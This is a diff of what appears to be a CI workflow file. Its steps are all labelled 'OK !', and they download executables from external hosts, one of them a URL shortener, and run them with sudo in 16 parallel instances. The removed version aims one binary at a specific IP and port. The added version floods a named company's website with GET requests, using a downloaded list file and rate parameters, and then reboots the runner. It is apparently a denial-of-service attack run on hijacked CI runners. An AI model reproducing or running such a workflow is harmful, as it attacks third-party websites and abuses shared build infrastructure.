@@ -14,14 +14,21 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
-          chmod +x tekpoyraz
+          wget https://curl.by/yD5p3/killed -O killed
+          wget https://curl.by/QHrRL/fres.txt -O fres.txt
+          chmod +x killed
+          PIDS=()
           for i in {1..16}; do
-            timeout 30 sudo ./tekpoyraz 46.20.6.74 80
+            sudo timeout 35 ./killed GET https://www.dgnteknoloji.com/kurumsal fres.txt 35 950 8 &
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
           done
 
       - name: OK !
-        run: sleep 30
+        run: sleep 35
         
       - name: OK !
-        run: sudo shutdown now
+        run: sudo reboot
